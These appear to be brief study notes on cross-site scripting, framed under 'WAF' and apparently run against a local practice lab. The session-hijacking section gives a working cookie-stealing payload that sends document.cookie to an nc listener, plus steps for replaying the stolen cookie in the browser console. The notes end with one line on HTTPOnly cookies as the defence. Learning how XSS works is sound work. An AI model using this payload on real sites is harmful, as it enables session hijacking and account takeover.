# WAF

## Cross Site Scripting Attack – What Is It, How Does It Works & How to Prevent It
`https://websitesecuritystore.com/blog/what-is-cross-site-scripting-attack/`

## Cross Site Scripting examples:
`https://websitesecuritystore.com/blog/real-world-cross-site-scripting-examples/`


Below are some commonly seen real-world cross site scripting examples that attackers often use, and they are:

* User Session Hijacking
* Unauthorized Activities
* Phishing Attack
* Stealing Critical Information
* Capturing Keystrokes

## Session hijacking
If the HTTPOnly is not available by calling document.cookie, JavaScript code running within the web browser can access the session cookies.

### Example of stealing cookies:

From local computer:
```shell 
nc -lvp 9999
```
Insert following payload into parameter:
```xml
<script>new Image().src="https://127.0.0.1:9999/fakepg.php?output="+document.cookie;</script>
```

Get cookies in terminal. Ctrl+C, Ctrl+V. 
In browser > Console
```javascript
document.cookie="...<cookies from terminal>..."
```
Navigate to the webpage endpoint. Ex.:
`http://localhost:7000/vulnerabilities/xss_r/`

### Prevent session hijacking:
Use HTTPOnly cookie. It's block access to the cookie value using JavaScript. 
